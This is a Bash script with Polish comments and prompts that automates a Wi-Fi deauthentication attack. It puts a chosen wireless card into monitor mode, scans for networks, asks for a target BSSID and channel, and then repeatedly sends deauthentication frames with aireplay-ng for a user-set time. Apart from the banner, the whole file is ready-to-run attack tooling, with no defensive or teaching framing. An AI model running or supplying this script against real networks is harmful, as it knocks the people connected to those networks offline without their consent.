#!/bin/bash
clear

# ASCII art banner
echo "
 █████   ███   █████  ███             ███████████  ███               
░░███   ░███  ░░███  ░░░             ░░███░░░░░░█ ░░░                
 ░███   ░███   ░███  ████             ░███   █ ░  ████               
 ░███   ░███   ░███ ░░███  ██████████ ░███████   ░░███               
 ░░███  █████  ███   ░███ ░░░░░░░░░░  ░███░░░█    ░███               
  ░░░█████░█████░    ░███             ░███  ░     ░███               
    ░░███ ░░███      █████            █████       █████              
     ░░░   ░░░      ░░░░░            ░░░░░       ░░░░░               
                                                                                                               
     █████                                █████    █████             
    ░░███                                ░░███    ░░███              
  ███████   ██████   ██████   █████ ████ ███████   ░███████          
 ███░░███  ███░░███ ░░░░░███ ░░███ ░███ ░░░███░    ░███░░███         
░███ ░███ ░███████   ███████  ░███ ░███   ░███     ░███ ░███         
░███ ░███ ░███░░░   ███░░███  ░███ ░███   ░███ ███ ░███ ░███         
░░████████░░██████ ░░████████ ░░████████  ░░█████  ████ █████        
 ░░░░░░░░  ░░░░░░   ░░░░░░░░   ░░░░░░░░    ░░░░░  ░░░░ ░░░░░         
                                                                                                                          
            █████     █████                       █████              
           ░░███     ░░███                       ░░███               
  ██████   ███████   ███████    ██████    ██████  ░███ █████         
 ░░░░░███ ░░░███░   ░░░███░    ░░░░░███  ███░░███ ░███░░███          
  ███████   ░███      ░███      ███████ ░███ ░░░  ░██████░           
 ███░░███   ░███ ███  ░███ ███ ███░░███ ░███  ███ ░███░░███          
░░████████  ░░█████   ░░█████ ░░████████░░██████  ████ █████         
 ░░░░░░░░    ░░░░░     ░░░░░   ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                                                                 
"

# Funkcja do sprawdzania czy klawisz "k" został naciśnięty
check_key_press() {
    # Odczytujemy klawisz w trybie nieblokującym
    read -rsn1 -t 0.1 key

    # Jeśli klawisz "k" został naciśnięty, zwracamy 0
    [[ "$key" == "k" ]]
}

echo "Pamietaj, ze skrypt musi byc uruchomiony jako root!"
echo "A twoja karta WiFi musi posiadac funkcje MONITOR MODE"

sleep 6
clear

# Wyświetlanie dostępnych interfejsów WiFi
iwconfig

# Zapytanie użytkownika o wybór interfejsu
read -p "Wybierz interfejs WiFi (np. wlan1): " wlanx

# Uruchamianie trybu monitor mode dla wybranej karty
airmon-ng check
airmon-ng check kill
airmon-ng start "$wlanx"

echo "Za chwile nastapi skanowanie dostepnych sieci Wi-Fi."
echo "Przerwij skanowanie za pomoca nacisniecia CTRL + C"

# Zapytanie użytkownika o rodzaj sieci do skanowania
read -p "Jaką sieć chcesz przeskanować? (1 - 2.4 GHz, 2 - 5 GHz): " network_type

# Sprawdzenie odpowiedzi użytkownika i uruchomienie odpowiedniego skanowania
if [[ "$network_type" == "1" ]]; then
    airodump-ng "$wlanx"
elif [[ "$network_type" == "2" ]]; then
    sudo airodump-ng "$wlanx" --band a
else
    echo "Nieprawidłowy wybór. Wybierz 1 lub 2."
    exit 1
fi

# Zapytanie użytkownika o BSSID sieci
read -p "Podaj BSSID wybranej sieci: " bssid

# Zapytanie użytkownika o kanal sieci
read -p "Podaj kanal CH wybranej sieci: " ch

# Nasluchiwanie wybranej sieci na wybranym kanale
echo "Za chwile nastapi nasluchiwanie wybranego kanalu sieci Wi-Fi."
echo "Zobaczysz ile urzadzen jest podlaczonych do AP."
echo "Przerwij nasluchiwanie za pomoca nacisniecia CTRL + C"
sleep 5
airodump-ng -d "$bssid" -c "$ch" "$wlanx"

# Zapytanie użytkownika o czas wykonywania polecenia aireplay-ng
read -p "Podaj czas wykonywania ataku deautoryzacj (w sekundach): " sekundy

echo "Za chwile nastapi atak deautoryzacji wybranej sieci Wi-Fi."
echo "Przerwij atak za pomoca nacisniecia klawisza 'K' "
sleep 5

# Czas rozpoczęcia ataku
start_time=$(date +%s)

# Wykonanie ataku deautentykacyjnego przez określoną liczbę sekund lub do momentu naciśnięcia klawisza "k"
while true; do
    # Aktualny czas
    current_time=$(date +%s)

    # Sprawdzenie, czy upłynął czas lub został naciśnięty klawisz "k"
    if [[ $((current_time - start_time)) -ge $sekundy ]]; then
        break
    fi

    # Sprawdzenie, czy został naciśnięty klawisz "k"
    if check_key_press; then
        break
    fi

    # Wykonanie ataku deautentykacyjnego
    aireplay-ng --deauth 10 -a "$bssid" -D "$wlanx"
done

# Zatrzymywanie trybu monitor mode dla wybranej karty
airmon-ng stop "$wlanx"

# Przywracanie normalnego dzialania sieci WiFi
systemctl restart NetworkManager.service
